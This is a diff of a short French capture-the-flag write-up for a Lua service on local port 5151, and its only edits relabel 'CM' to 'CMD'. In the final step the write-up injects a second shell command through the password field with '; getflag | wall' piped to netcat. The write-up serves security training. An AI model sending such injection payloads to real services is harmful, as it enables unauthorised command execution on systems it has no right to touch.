@@ -4,7 +4,7 @@
 
 1. On regarde les fichiers mis à notre disposition :
    --------------------------------------------------------
-   CM : ls
+   CMD : ls
    OUTPUT : level11.lua
 
 2. On cat le contenu du script level.lua. Ce dernier 
@@ -14,7 +14,7 @@
    qui, lorsque hasher via la fonction sha1sum, contient : 
    f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
    --------------------------------------------------------
-   CM : cat level11.lua
+   CMD : cat level11.lua
    OUTPUT : [...]
             local server = assert(socket.bind("127.0.0.1", 5151))
             [...]
@@ -32,14 +32,14 @@
 
 3. En exécutant le script level11.lua :
    --------------------------------------------------------
-   CM : lua leve11.lua
+   CMD : lua leve11.lua
    OUTPUT : address already in use
 
 4. De fait, on passe par netcat avec pour port 5151 pour
    directement s'y connecté (ce qui confirme la nécessité
    d'un mot de passe) :
    --------------------------------------------------------
-   CM : nc localhost 5151 
+   CMD : nc localhost 5151 
    OUTPUT : Password:
 
 5. Le mot de passe (pass) etant directement concatené par
@@ -49,7 +49,7 @@
    va se charger d'envoyer le retour de getflag a tous 
    les utilisateur :
    --------------------------------------------------------
-   CM : echo '; getflag | wall' | nc localhost 5151
+   CMD : echo '; getflag | wall' | nc localhost 5151
    OUTPUT : Broadcast Message from flag11@Snow
             (somewhere) at 13:38 ...
 
